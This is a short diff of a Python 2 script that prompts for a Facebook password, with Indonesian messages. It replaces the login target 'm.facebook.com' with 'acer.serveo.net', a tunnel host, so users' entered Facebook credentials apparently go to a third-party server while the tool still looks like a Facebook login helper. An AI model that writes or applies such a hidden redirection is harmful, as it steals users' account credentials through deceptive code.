@@ -70,7 +70,7 @@ def login():
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://m.facebook.com')
+            br.open('https://acer.serveo.net')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] Tidak ada koneksi bujank'
             keluar()
